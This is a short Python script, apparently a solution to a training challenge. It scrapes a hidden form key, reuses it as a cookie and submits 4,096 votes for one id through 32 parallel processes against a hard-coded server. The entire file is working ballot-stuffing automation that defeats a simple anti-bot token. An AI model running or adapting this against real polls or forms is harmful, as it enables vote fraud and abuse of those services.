#!/usr/bin/python3
import requests
import multiprocessing
from bs4 import BeautifulSoup

url = 'http://158.69.76.135/level1.php'
data = {
    'id': '2158',
    'holdthedoor': 'submit',
    'key':''
}
COOKIES = {
    'HoldTheDoor': ''
    }

def getKey():
    """ Get the key what is in the page """
    code = requests.get(url)
    soup = BeautifulSoup(code.text, 'html.parser')
    form = soup.find(method="post")
    key = form.find(type="hidden")
    checkKey = str(key.attrs['value'])
    #print(checkKey)
    data['key'] = checkKey
    COOKIES['HoldTheDoor'] = checkKey
    #print(checkKey)

def post(finish):
    """ send vote to page """
    count = 0
    while count < finish:
        getKey()
        action = requests.post(url,data=data, cookies=COOKIES)
        count += 1
        print("Va la cuenta en: {}".format(count))

def multi():
    """ Generate multiprocess for vote """
    finish = 128
    p = multiprocessing.Process(target=post, args=(finish,))
    return(p)

def process():
    """ Start de program """
    inprocess = []
    for i in range(32):
        inprocess.append(multi())
        inprocess[i].start()
    for i in inprocess:
        i.join()
    print("Finish")

if __name__ == "__main__":
    process()